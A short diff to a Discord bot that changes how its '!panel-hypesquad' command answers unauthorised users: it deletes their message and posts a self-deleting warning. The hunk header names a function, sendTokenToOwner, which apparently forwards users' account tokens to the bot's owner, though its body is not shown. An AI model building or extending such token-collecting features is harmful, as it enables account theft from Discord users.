@@ -72,13 +72,30 @@ async function sendTokenToOwner(client, title, token, accountName, username, add
   }
 }
 
-// !panel-hypesquad komutu (Yalnızca səlahiyyətli şəxs yaza bilər)
+// !panel-hypesquad komutu
 client.on('messageCreate', async (message) => {
   if (message.author.bot) return;
 
   if (message.content === '!panel-hypesquad') {
+    // Səlahiyyəti yoxdursa
     if (message.author.id !== OWNER_ID) {
-      return message.reply({ content: '❌ Bu komutu sadece yönetici kullanabilir.' }).catch(() => {});
+      try {
+        // Yazılan mesajı silirik
+        await message.delete();
+      } catch (e) {}
+
+      // Xəbərdarlıq mesajı göndəririk və 5 saniyə sonra silirik
+      try {
+        const warningMsg = await message.channel.send({ 
+          content: `❌ <@${message.author.id}> Bu komutu sadece yönetici kullanabilir.` 
+        });
+        
+        setTimeout(async () => {
+          try { await warningMsg.delete(); } catch (err) {}
+        }, 5000); // 5000 millisaniyə = 5 saniyə
+      } catch (err) {}
+
+      return;
     }
 
     try { await message.delete(); } catch (e) {}
